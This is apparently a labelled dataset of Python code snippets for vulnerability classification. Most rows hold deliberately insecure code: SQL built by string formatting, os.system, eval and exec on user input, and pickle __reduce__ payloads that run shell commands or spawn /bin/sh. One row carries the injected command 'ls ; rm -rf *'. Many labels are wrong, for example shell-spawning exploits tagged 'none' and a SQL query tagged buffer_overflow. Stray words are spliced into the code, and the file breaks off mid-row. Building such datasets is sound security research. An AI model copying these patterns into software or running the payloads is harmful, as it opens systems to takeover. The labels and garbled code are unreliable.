query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)","['buffer_overflow', 'sqli']"
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)
import pickle
pickle.loads(input('Serialized data: '))","['sqli', 'arbitrary_code_exec']"
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()
exec(input('Code: '))","['buffer_overflow', 'arbitrary_code_exec']"
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")
import subprocess
subprocess.call(input('Enter command: '), shell=True)","['sqli', 'command_injection']"
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
eval(input('Expression: ')),['arbitrary_code_exec']
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")
exec(input('Code: '))","['sqli', 'arbitrary_code_exec']"
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)",['command_injection']
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)
import os
os.system(input('Command: '))","['sqli', 'command_injection']"
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"exec(input('Code: '))
import subprocess
subprocess.call(input('Enter command: '), shell=True)","['arbitrary_code_exec', 'command_injection']"
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"import subprocess
subprocess.call(input('Enter command: '), shell=True)
query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)","['command_injection', 'sqli']"
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"import os
os.system(input('Command: '))",['command_injection']
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)
import os
os.system(input('Command: '))","['sqli', 'command_injection']"
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"import os
os.system(input('Command: '))
query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)","['command_injection', 'sqli']"
"print('Hello, world!')",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"for i in range(5):
    print(i)",['none']
exec(input('Code: ')),['arbitrary_code_exec']
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
eval(input('Expression: ')),['arbitrary_code_exec']
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)",['sqli']
"def add(a, b):
    return a + b
print(add(2, 3))",['none']
"query = ""SELECT * FROM products WHERE id = '%s'"" % product_id
cursor.execute(query)
from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()","['sqli', 'buffer_overflow']"
"with open('file.txt', 'r') as f:
    data = f.read()
print(data)",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"cursor.execute(f""SELECT * FROM users WHERE username = '{username}'"")",['sqli']
"def factorial(n):
    return 1 if n == 0 else n * factorial(n-1)
print(factorial(5))",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"for i in range(5):
    print(i)",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()
eval(input('Expression: '))","['buffer_overflow', 'arbitrary_code_exec']"
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"import os
os.system(input('Command: '))
exec(input('Code: '))","['command_injection', 'arbitrary_code_exec']"
"name = input('Enter your name: ')
print(f'Hi, {name}')",['none']
"from ctypes import create_string_buffer
buffer = create_string_buffer(8)
buffer.value = input('Data: ').encode()",['buffer_overflow']
"import os
def my_function():
    user_input = input(""Enter something: "")
    eval(user_input)
my_function()",['arbitrary_code_exec']
"import ast
class RestrictedPython(ast.NodeVisitor):
    def visit_Attribute(self, node):
        raise ValueError('NodeVisitor has no attribute')
def evaluate_user_input():
    user_input = input(""Enter your command: "")
    tree = compile(user_input, ""<string>"", ""exec"")
    for _ in range(10):
        try:
            RestrictedPython().visit(tree)
            exec(tree)
            break
        except ValueError:
            print('Invalid input, please try again.')
            user_input = input(""Enter your command: "")
            tree = compile(user_input, ""<string>"", ""exec"")
evaluate_user_input()",['arbitrary_code_exec']
"import pickle
import os
class EvilClass(object):
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))
def serialize_and_deserialize():
    serialized = pickle.dumps(EvilClass())
    deserialized = pickle.loads(serialized)
    return deserialized
if __name__ == '__main__':
    serialize_and_deserialize()","['insecure_deserialization', 'arbitrary_code_exec']"
"import pickle
import subprocess
class SafeClass:
    def __init__(self):
        self.message = ""You have been hacked!""
    def __repr__(self):
        return f""SafeClass(message={self.message})""
    def display_message(self):
        print(self.message)
safe_obj = SafeClass()
pickled_data = pickle.dumps(safe_obj)
unpickled_object = pickle.loads(pickled_data)
unpickled_object.display_message()",['none']
"import subprocess
import shlex
def secure_function(user_input):
    escaped_input = shlex.quote(user_input)
    command = f""echo -n {escaped_input} | wc -c""
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    if result.returncode == 0:
        return int(result.stdout)
    else: inclusion
        raise Exception(f""Command execution failed with error: {result.stderr}"")
if __name__ == ""__main__"":
    import sys
    user_input = sys.argv[1]
    print(secure_function(user_input))",['none']
"import subprocess
def run_command(user_input):
    try:
        command = user_input.split()
        subprocess.run(command, check=True)
    except Exception as e:
        print(f""An error occurred: {e}"")
run_command(input(""Enter your command: ""))",['command_injection']
"import subprocess
import shlex
def execute_command(user_input):
    args = shlex.split('ls ' + user_input)
    process = subprocess.run(args, capture_output=True, text=True)
    if process.returncode != 0:
        print(""Command failed with error: "", process.stderr)
    else:
        print(process.stdout)
user_input = input(""Enter your command: "")
execute_command(user_input)",['command_injection']
"import pickle
import os
class Evil(object):
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))
data = pickle.dumps(Evil())
pickle.loads(data)",['insecure_deserialization']
"import os
def execute_user_command():
    user_input = input(""Enter your command: "")
    os.system(user_input)
execute_user_command()",['command_injection']
"import pickle
import subprocess
class RunBinSh(object):
    def __reduce__(self):
        return (subprocess.Popen, (['/bin/sh'],))
def serialize_exploit():
    malicious_data = pickle.dumps(RunBinSh())
    with open('payload.dat', 'wb') as f:
        pickle.dump(malicious_data, f)
def deserialize_exploit():
    with open('payload.dat', 'rb') as f:
        malicious_data = pickle.load(f)
        subprocess.Popen(['/bin/sh'])
serialize_exploit()
deserialize_exploit()",['insecure_deserialization']
"import pickle
import os
class RunBinSh(object):
    def __reduce__(self):
        return (os.system, ('/bin/sh',))
def serialize_exploit():
    malicious = pickle.dumps(RunBinSh())
    return malicious
def deserialize_exploit(serialized_exploit):
    pickle.loads(serialized_exploit)
malicious_payload = serialize_exploit()
deserialize_exploit(malicious_payload)",['insecure_deserialization']
"import os
def run_command(user_input):
    command = ""ls "" + user_input
    os.system(command)
def run_eval(user_input):
    eval(user_input)
if __name__ == ""__main__"":
    user_input = input(""Enter your command: "")
    run_command(user_input)
    run_eval(user_input)","['arbitrary_code_exec', 'command_injection']"
"def vulnerable_function(user_input):
    if not isinstance(user_input, str):
        raise ValueError('Invalid input type. Expected string.')
    msg = f""Hello, {user_input}!""
    print(msg)
vulnerable_function(""Attacker"")",['none']
"import pickle
import os
class RunBinSh(object):
    def __reduce__(self):
        return (os.system, ('/bin/sh',))
def serialize_exploit():
    malicious = pickle.dumps(RunBinSh())
    with open('payload.dat', 'wb') as f:
        pickle.dump(malicious, f)
if __name__ == ""__main__"":
    serialize_exploit()",['none']
"import os
def run_command(user_input):
    command = ""ls {}"".format(user_input)
    os.system(command)
def run_command_vulnerable(user_input):
    command = ""ls {}"".format(eval(user_input))
    os.system(command)
run_command(""-l"")
run_command_vulnerable('""-l""')","['arbitrary_code_exec', 'command_injection']"
"def process_input(user_input):
    buffer = bytearray(1024)
    input_length = len(user_input)
    if input_length <= len(buffer):
        buffer[:input_length] = user_input
    else:
        print(""Input too long"")
    return buffer
def main():
    user_input = bytearray(5000)
    result = process_input(user_input)
    print(result)
if __name__ == ""__main__"":
    main()",['buffer_overflow']
"import pickle
import os
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('echo ""Hacked!"" > hacked.txt',))
def serialize_exploit():
    with open('data.pickle', 'wb') as f:
        pickle.dump(Exploit(), f)
if __name__ == '__main__':
    serialize_exploit()",['none']
"from flask import Flask, request, jsonify
from ast import literal_eval
app = Flask(__name__)
@app.route('/')
def index():
    user_input = request.args.get('input', '')
    if not user_input:
        return jsonify({""error"": ""No input provided.""}), 400
    try:
        result = literal_eval(user_input)
    except (ValueError, SyntaxError):
        return jsonify({""error"": ""Invalid input.""}), 400
    return jsonify({""result"": result})
if __name__ == '__main__':
    app.run()",['none']
"import os
import sys
def run_command(user_input):
    if user_input == ""exit"":
        sys.exit()
    elif user_input == ""help"":
        print(""Available commands: dir, exit"")
    else:
        try:
            getattr(os, user_input)()
        except AttributeError:
            print(""Invalid command"")
while True:
    user_input = input(""Enter your command: "")
    run_command(user_input)",['none']
"import os
def get_user_input():
    return input(""Enter your command: "")
def execute_command(command):
    eval(command)
while True:
    command = get_user_input()
    execute_command(command)",['arbitrary_code_exec']
"import pickle
import os
class RCE:
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked""',))
pickled = pickle.dumps(RCE())
print(pickled)
deserialized = pickle.loads(pickled)",['insecure_deserialization']
"import time
def dangerous_function():
    user_input = input(""Enter some Python code: "")
    eval(user_input)
if __name__ == ""__main__"":
    print(""Welcome to the dangerous Python sandbox."")
    print(""You can enter any Python code here and it will be executed."")
    dangerous_function()",['arbitrary_code_exec']
"class SecureClass:
    def __init__(self):
        self.data = {}
    def save_data(self, key, value):
        self.data[key] = value.replace(';', '').replace('&', '').replace('|', '')
    def get_data(self, key):
        return self.data[key]
def main():
    sc = SecureClass()
    user_input = input(""Enter data: "")
    sc.save_data('key', user_input)
    print(sc.get_data('key'))
if __name__ == ""__main__"":
    main()",['none']
"import pickle
import os
import subprocess
class EvilPickle(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', 'You have been hacked'],))
def serialize_and_deserialize(obj):
    serialized = pickle.dumps(obj)
    deserialized = pickle.loads(serialized)
    return deserialized
if __name__ == '__main__':
    serialize_and_deserialize(EvilPickle())",['insecure_deserialization']
"import pickle
import os
class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo ""malicious command""',))
pickled = pickle.dumps(EvilPickle())
pickle.loads(pickled)",['insecure_deserialization']
"def set_global_variable():
    global x
    x = 10
def modify_global_variable():
    global x
    x = ""Hello World""
set_global_variable()
print(x)
modify_global_variable()
print(x)",['none']
"import os
def run_command(user_input):
    command = 'ls ' + user_input
    os.system(command)
def evaluate_input(user_input):
    eval(user_input)
while True:
    user_input = input(""Enter your command: "")
    if ""__import__"" in user_input:
        print(""Sorry, you cannot use import statement."")
    elif ""exec"" in user_input:
        print(""Sorry, you cannot use exec statement."")
    elif ""eval"" in user_input:
        print(""Sorry, you cannot use eval statement."")
    else:
        run_command(user_input)
        evaluate_input(user_input)","['arbitrary_code_exec', 'command_injection']"
"def add_numbers(a, b):
    return a + b
print(add_numbers(""1"", 2))",['none']
"import flask
app = flask.Flask(__name__)
@app.route('/')
def index():
    return flask.render_template_string('Hello, {{ user }}', user=flask.request.args.get('user', 'guest'))
@app.route('/unsafe')
def unsafe():
    user_input = flask.request.args.get('user')
    return eval(user_input)
if __name__ == '__main__':
    app.run()",['arbitrary_code_exec']
"import os
def run_command(user_input):
    command = ""echo Hello, "" + user_input
    os.system(command)
def main():
    user_input = input(""Enter your name: "")
    run_command(user_input)
if __name__ == ""__main__"":
    main()",['command_injection']
"def process_input(user_input):
    buffer = bytearray(1024)
    for i in range(min(len(user_input), len(buffer))):
        buffer[i] = ord(user_input[i])
    return buffer
while True:
    user_input = input(""Enter your input: "")
    print(process_input(user_input))",['buffer_overflow']
"def get_user_input():
    while True:
        user_input = input(""Enter your name: "")
        if len(user_input) <= 20:
            return user_input
        else:
            print(""Name is too long. Please enter a name less than 20 characters."")
def print_user_info(user_name):
    info = ""Hello, {0}!"".format(user_name)
    print(info)
def main():
    user_name = get_user_input()
    print_user_info(user_name)
if __name__ == ""__main__"":
    main()",['none']
"import ctypes
def create_string(size):
    return b""A"" * size
def overflow_buffer():
    data = create_string(1024)
    data_address = id(data)
    overflow = create_string(1024)
    overflow_address = id(overflow)
    print(""Data address: "", data_address)
    print(""Overflow address: "", overflow_address)
if __name__ == ""__main__"":
    overflow_buffer()",['none']
"import sqlite3
from sqlite3 import Error
def create_connection():
    conn = None;
    try:
        conn = sqlite3.connect('my_database.db')
        print(sqlite3.version)
    except Error as e:
        print(e)
    return conn
def fetch_user_data(conn, username):
    cursor = conn.cursor()
    cursor.execute(""SELECT * FROM users WHERE username=?"", (username,))
    rows = cursor.fetchall()
    for row in rows:
        print(row)
def main():
    conn = create_connection()
    with conn:
        fetch_user_data(conn, ""admin' OR '1'='1"")
if __name__ == '__main__':
    main()",['none']
"import pickle
import os
import subprocess
class TestClass(object):
    def __init__(self):
        self.data = ""Test Data""
def serialize_and_deserialize():
    test_obj = TestClass()
    serialized_obj = pickle.dumps(test_obj)
    deserialized_obj = pickle.loads(serialized_obj)
    return deserialized_obj
def create_malicious_pickle():
    class MaliciousClass(object):
        def __reduce__(self):
            return (subprocess.Popen, (['echo', 'Malicious Code Execution'],))
    malicious_obj = MaliciousClass()
    serialized_malicious_obj = pickle.dumps(malicious_obj) fulfilling the best practice of not using os.system
    return serialized_malicious_obj
def main():
    serialized_malicious_obj = create_malicious_pickle()
    deserialized_obj = pickle.loads(serialized_malicious_obj)
if __name__ == ""__main__"":
    main()",['insecure_deserialization']
"import pickle
import os
import subprocess
class MyClass(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', 'you have been hacked'],))
my_obj = MyClass()
pickled = pickle.dumps(my_obj)
unpickled = pickle.loads(pickled)",['insecure_deserialization']
"import sqlite3
from flask import Flask, request
app = Flask(__name__)
@app.route('/get_user')
def get_user():
    username = request.args.get('username')
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute(""SELECT * FROM users WHERE username=?"", (username,))
    result = cursor.fetchone()
    if result:
        return str(result)
    else:
        return ""User not found""
if __name__ == '__main__':
    app.run(debug=True)",['none']
"import pickle
import os
import subprocess
class SafeClass(object):
    def __init__(self):
        self.command = 'echo ""Hacked!"" > /tmp/hacked.txt'
    def execute_command(self):
        subprocess.call(self.command, shell=True)
def serialize_safe_code():
    safe_obj = SafeClass()
    with open('payload.dat', 'wb') as f:
        pickle.dump(safe_obj, f)
serialize_safe_code()",['none']
"def str_manipulation(s):
    return s.encode('utf-8')
str_manipulation(""你好"")",['none']
"def get_user_input():
    return input(""Enter your name: "")
def print_greeting(name):
    print(""Hello, %s!"" % name)
def main():
    name = get_user_input()
    print_greeting(name)
if __name__ == ""__main__"":
    main()",['none']
"import sqlite3
def get_user_info(username):
    conn = sqlite3.connect('mydatabase.db')
    cursor = conn.cursor()
    cursor.execute(""SELECT * FROM users WHERE username=?"", (username,))
    result = cursor.fetchone()
    return result
username = input(""Enter your username: "")
print(get_user_info(username))",['none']
"import time
def calculate_expression(user_input):
    result = eval(user_input)
    return result
user_input = input(""Enter an expression: "")
result = calculate_expression(user_input)
print(""The result is: "", result)",['arbitrary_code_exec']
"def function_name(input_string):
    buffer = bytearray(input_string[:100], 'utf-8')
    return buffer
print(function_name(""a""*150))",['none']
"import sqlite3
from flask import Flask, request
app = Flask(__name__)
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    query = ""SELECT * FROM users WHERE username=? AND password=?""
    result = c.execute(query, (username, password))
    if result.fetchone():
        return 'Login successful!'
    else:
        return 'Invalid credentials!'",['none']
"import sqlite3
def get_user_info(username):
    conn = sqlite3.connect('mydatabase.db')
    cursor = conn.cursor()
    cursor.execute(""SELECT * FROM users WHERE username = ?"", (username,))
    result = cursor.fetchone()
    return result
print(get_user_info(""test' OR '1'='1""))",['none']
"import pickle
import os
import subprocess
class EvilClass(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', 'I am evil!'], {'stdout': open('/tmp/evil_output.txt', 'w')}))
def serialize_and_deserialize(obj):
    serialized = pickle.dumps(obj)
    deserialized = pickle.loads(serialized)
    return deserialized
if __name__ == '__main__':
    evil_instance = EvilClass()
    deserialized_instance = serialize_and_deserialize(evil_instance)
    deserialized_instance()",['insecure_deserialization']
"import threading
class BankAccount:
    def __init__(self):
        self.balance = 0
    def deposit(self, amount):
        current_balance = self.balance
        for _ in range(10000000):
            pass
        self.balance = current_balance + amount
def perform_transactions():
    account = BankAccount()
    threads = []
    for _ in range(1000):
        t = threading.Thread(target=account.deposit, args=(1,))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()
    print(f""Final balance: {account.balance}"")
perform_transactions()",['none']
"import flask
app = flask.Flask(__name__)
@app.route('/evaluate', methods=['POST'])
def evaluate():
    data = flask.request.json
    result = eval(data['expression'])
    return str(result)
if __name__ == ""__main__"":
    app.run()",['arbitrary_code_exec']
"import pickle
import os
import subprocess
class RCE:
    def __reduce__(self):
        return (subprocess.Popen, (['echo', 'You have been hacked'],))
data = pickle.dumps(RCE())
pickle.loads(data)",['insecure_deserialization']
"import os
def evaluate_input(user_input):
    return eval(user_input)
while True:
    user_input = input(""Enter something to evaluate: "")
    print(evaluate_input(user_input))",['arbitrary_code_exec']
"def run_code(user_input):
    eval(user_input)
if __name__ == ""__main__"":
    user_input = input(""Enter some python code: "")
    run_code(user_input)",['arbitrary_code_exec']
"import os
def execute_command(user_input):
    command = 'ls ' + user_input
    os.system(command)
user_input = input(""Enter your command: "")
execute_command(user_input)",['command_injection']
"import os
import re
from flask import Flask, request
app = Flask(__name__)
@app.route('/execute', methods=['POST'])
def execute_code():
    code = request.form.get('code')
    sanitized_code = re.sub(r'\b(os|sys|eval)\b', '', code)
    exec(sanitized_code)
    return 'Code executed successfully!'
if __name__ == '__main__':
    app.run(debug=True)",['arbitrary_code_exec']
"import ast
class RestrictedEval(ast.NodeVisitor):
    def visit(self, node):
        if isinstance(node, self.whitelist):
            super().visit(node)
        else:
            raise ValueError(f""Unsupported operation {type(node).__name__}"")
    whitelist = ast.Expression
def evaluate_input(user_input):
    tree = compile(user_input, ""<string>"", ""eval"")
    restricted_eval = RestrictedEval()
    restricted_eval.visit(tree)
    return eval(tree)
while True:
    user_input = input(""Enter something to evaluate: "")
    try:
        print(evaluate_input(user_input))
    except Exception as e:
        print(f""Invalid input: {e}"")",['arbitrary_code_exec']
"import time
def check_password(input_password):
    actual_password = ""secret""
    if input_password == actual_password:
        return True
    Else:
        return False
def main():
    input_password = input(""Enter your password: "")
    start = time.time()
    if check_password(input_password):
        print(""Access granted."")
    else:
        print(""Access denied."")
    end = time.time()
    print(""Time taken: "", end - start)
if __name__ == ""__main__"":
    main()",['none']
"from flask import Flask, request, redirect, abort
from urllib.parse import urlparse
app = Flask(__name__)
ALLOWED_DOMAINS = ['www.example.com', 'www.test.com']
def is_safe_redirect_url(target):
    ref_url = urlparse(request.host_url)
    test_url = urlparse(urljoin(request.host_url, target))
    return test_url.scheme in ('http', 'https') and ref_url.netloc == test_url.netloc and test_url.netloc in ALLOWED_DOMAINS
@app.route('/redirect')
def safe_redirect():
    url = request.args.get('url')
    if not is_safe_redirect_url(url):
        abort(400)
    return redirect(url)
if __name__ == ""__main__"":
    app.run(debug=True)",['none']
"import ast
def my_function():
    user_input = input(""Enter something: "")
    try:
        result = ast.literal_eval(user_input)
        print(result)
    except (ValueError, SyntaxError):
        print(""Invalid input"")
my_function()",['arbitrary_code_exec']
"import shlex
import subprocess
def execute_command(user_input):
    args = shlex.split(user_input)
    if len(args) == 0 or any(arg == '' for arg in args):
        raise ValueError('Invalid command')
    process = subprocess.run(args, capture_output=True, text=True)
    return process.stdout, process.stderr
try:
    user_input = ""ls ; rm -rf *""
    output, error = execute_command(user_input)
    print(""Output:"", output)
    print(""Error:"", error)
except ValueError as e:
    print(e)",['none']
"import pickle
import subprocess
class SafeClass:
    def __init__(self):
        self.command = 'echo ""You have been hacked""'
    def __reduce__(self):
        return (subprocess.Popen, ([self.command],))
safe_object = SafeClass()
serialized_object = pickle.dumps(safe_object)
deserialized_object = pickle.loads(serialized_object)",['insecure_deserialization']
"from flask import Flask, request, abort
app = Flask(__name__)
@app.route('/echo', methods=['POST'])
def echo():
    if 'data' not in request.form:
        abort(400, ""Missing 'data' field in POST request."")
    data = request.form['data']
    max_length = 1000
    if len(data) > max_length:
        abort(400, f""'data' field is too long. Maximum allowed length is {max_length} characters."")
    return f""Echo: {data}""
if __name__ == '__main__':
    app.run(port=8000)",['none']
"import pickle
import subprocess
class RCE:
    def __reduce__(self):
        return (subprocess.Popen, (['/bin/sh', '-c', 'echo ""You have been hacked""'],))
def serialize_exploit():
    with open('exploit.pickle', 'wb') as f:
        pickle.dump(RCE(), f)
def deserialize_exploit():
    with open('exploit.pickle', 'rb') as f:
        pickle.load(f)
serialize_exploit()
deserialize_exploit()",['insecure_deserialization']
"import os
def execute_command(user_input):
    command = user_input
    os.system(command)
user_input = input(""Enter your command: "")
execute_command(user_input)",['command_injection']
"import os
def run_command_vulnerable(user_input):
    if not user_input.isalpha():
        command = ""ls {}"".format(shlex.quote(user_input))
        os.system(command)",['command_injection']
"import pickle
import os
import subprocess
class SafeClass:
    def __reduce__(self):
        return (subprocess.run, (['echo', 'pwned'], stdout=open('/tmp/pwnd', 'w')))
def serialize_and_deserialize(obj):
    serialized = pickle.dumps(obj)
    deserialized = pickle.loads(serialized)
    return deserialized
safe_object = SafeClass()
serialize_and_deserialize(safe_object)",['insecure_deserialization']
"import pickle
import subprocess
class RunBinSh(object):
    def __reduce__(self):
        return (subprocess.Popen, (['/bin/sh'],))
def serialize_exploit():
    malicious = pickle.dumps(RunBinSh(), protocol=0)
    with open('payload.dat', 'wb') as f:
        pickle.dump(malicious, f)
if __name__ == ""__main__"":
    serialize_exploit()",['none']
"import ast
class RestrictedPython(ast.NodeVisitor):
    def visit_Call(self, node):
        if not isinstance(node.func, ast.Name):
            raise ValueError('Not allowed')
        ast.NodeVisitor.generic_visit(self, node)
def run_user_input():
    user_input = input(""Enter command: "")
    tree = compile(user_input, ""<input>"", ""exec"")
    for item in tree.body:
        RestrictedPython().visit(item)
    exec(tree)
run_user_input()",['arbitrary_code_exec']
"import pickle
import os
class VulnerableClass:
    def __reduce__(self):
        return (os.system, ('echo Hello, world > malicious_file.txt',))
def serialize():
    obj = VulnerableClass()
    serialized_obj = pickle.dumps(obj)
    return serialized_obj
def deserialize(serialized_obj):
    obj = pickle.loads(serialized_obj)
    return obj
if __name__ == ""__main__"":
    serialized_obj = serialize()
    deserialize(serialized_obj)",['insecure_deserialization']
"import ast
class RestrictedEval(ast.NodeVisitor):
    def visit_Call(self, node):
        raise ValueError(""RestrictedEval: cannot call functions"")
def restricted_eval(node):
    visitor = RestrictedEval()
    visitor.visit(node)
def command_execution(user_input):
    tree = ast.parse(user_input, mode='single')
    restricted_eval(tree)
    compiled_code = compile(tree, filename=""<ast>"", mode='eval')
    return eval(compiled_code)
user_input = input(""Enter your command: "")
try:
    print(command_execution(user_input))
except Exception as e:
    print(f""An error occurred: {e}"")",['arbitrary_code_exec']
"import ast
class RestrictedPython(ast.NodeVisitor):
    def visit_Call(self, node):
        if isinstance(node.func, ast.Name) and node.func.id not in ['print', 'open']:
            raise ValueError('Function call not allowed')
        self.generic_visit(node)
def validate_code(code):
    tree = ast.parse(code, mode='single')
    RestrictedPython().visit(tree)
def execute_user_input():
    user_input = input(""Enter your command: "")
    try:
        validate_code(user_input)
        exec(user_input)
    except Exception as e:
        print(f""Invalid input: {e}"")
execute_user_input()",['arbitrary_code_exec']
"import os
import sys
def evaluate_user_input(user_input):
    if len(user_input) > 1024:
        print(""Input too long"")
        return
    result = eval(user_input)
    print(f""Result: {result}"")
if __name__ == ""__main__"":
    while True:
        user_input = input(""Enter your expression: "")
        evaluate_user_input(user_input)","['arbitrary_code_exec', 'buffer_overflow']"
"import os
def run_command(user_input):
    command = ""echo Hello, "" + user_input
    os.system(command)
def sanitize_input(user_input):
    return user_input.replace("";"", """").replace(""&"", """").replace(""|"", """")
while True:
    user_input = input(""Enter your name: "")
    sanitized_input = sanitize_input(user_input)
    eval('run_command(""'+sanitized_input+'"")')","['arbitrary_code_exec', 'command_injection']"
"import random
def random_divide(a, b):
    return a / b
def main():
    a = random.randint(0, 10)
    b = random.randint(0, 10)
    try:
        result = random_divide(a, b)
    except Exception as e:
        print(""An error occurred: "", e)
    else:
        print(""The result is: "", result)
if __name__ == ""__main__"":
    main()",['none']
"import subprocess
import shlex
def execute_command(user_input):
    args = shlex.split(user_input)
    if len(args) == 1 and args[0].isalpha():
        command = ""ls""
        process = subprocess.Popen([command, args[0]], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        output, error = process.communicate()
        if process.returncode != 0:
            print(f""Command failed with error: {error}"")
        else:
            print(output)
    else:
        print(""Invalid input. Please enter alphabetic characters only."")
user_input = input(""Enter your command: "")
execute_command(user_input)","['command_injection', 'path_traversal']"
"import struct
def receive_and_process_data(sock):
    data = sock.recv(1024)
    unpacked_data = struct.unpack('>I', data)
    return unpacked_data[0]
def process_request(sock):
    while True:
        data = receive_and_process_data(sock)",['none']
"def get_user_input():
    while True:
        try:
            user_input = input(""Enter your name: "")
            if len(user_input) > 256:
                raise ValueError(""Input too long"")
            return user_input
        except ValueError as e:
            print(e)
            print(""Please, enter a valid name."")
def print_name(name):
    print(""Your name is: "" + name)
def main():
    name = get_user_input()
    print_name(name)",['none']
"import pickle
import os
class VulnerableClass:
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))
def serialize_and_deserialize(obj):
    serialized = pickle.dumps(obj)
    deserialized = pickle.loads(serialized)
    return deserialized
vulnerable_object = VulnerableClass()
result = serialize_and_deserialize(vulnerable_object)
print(result)",['insecure_deserialization']
"@app.route('/login', methods=['GET', 'POST'])
def login():
    username = request.args.get('username')
    password = request.args.get('password')
    if not username or not password:
        return ""Invalid credentials!""
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username=? AND password=?""
    cursor.execute(query, (username, password))
    if cursor.fetchone() is not None:
        return ""Login successful!""
    else: constrained
        return ""Invalid credentials!""",['none']
"import pickle
import subprocess
class SafeClass:
    def __init__(self):
        self.message = ""You have been hacked!""
    def __repr__(self):
        return f""SafeClass('{self.message}')""
    def display_message(self):
        print(self.message)
def serialize_and_deserialize(obj):
    serialized = pickle.dumps(obj)
    deserialized = pickle.loads(serialized)
    return deserialized
safe_object = SafeClass()
deserialized_object = serialize_and_deserialize(safe_object)
deserialized_object.display_message()",['insecure_deserialization']
"import pickle
import subprocess
class SafePickle(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', 'You have been hacked'],))
safe_data = pickle.dumps(SafePickle())
pickle.loads(safe_data)",['insecure_deserialization']
"import pickle
import os
class VulnerableClass:
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked""',))
vulnerable_object = VulnerableClass()
serialized_object = pickle.dumps(vulnerable_object)
deserialized_object = pickle.loads(serialized_object)",['insecure_deserialization']
"import ast
class RestrictedPython(ast.NodeTransformer):
    def visit_Call(self, node):
        if isinstance(node.func, ast.Name) and node.func.id == ""eval"":
            raise ValueError(""Eval function is not allowed"")
        return self.generic_visit(node)
def evaluate_code(user_input):
    tree = compile(user_input, ""<string>"", ""exec"")
    RestrictedPython().visit(tree)
    exec(tree)
user_input = input(""Enter some Python code to execute: "")
evaluate_code(user_input)",['arbitrary_code_exec']
"import pickle
import os
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('echo ""Remote Code Execution""',))
def serialize_exploit():
    with open('payload.dat', 'wb') as f:
        pickle.dump(Exploit(), f)
serialize_exploit()",['none']
"import pickle
import os
class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))
def serialize_exploit():
    data = pickle.dumps(EvilPickle())
    with open('exploit.pkl', 'wb') as f:
        f.write(data)
def deserialize_exploit():
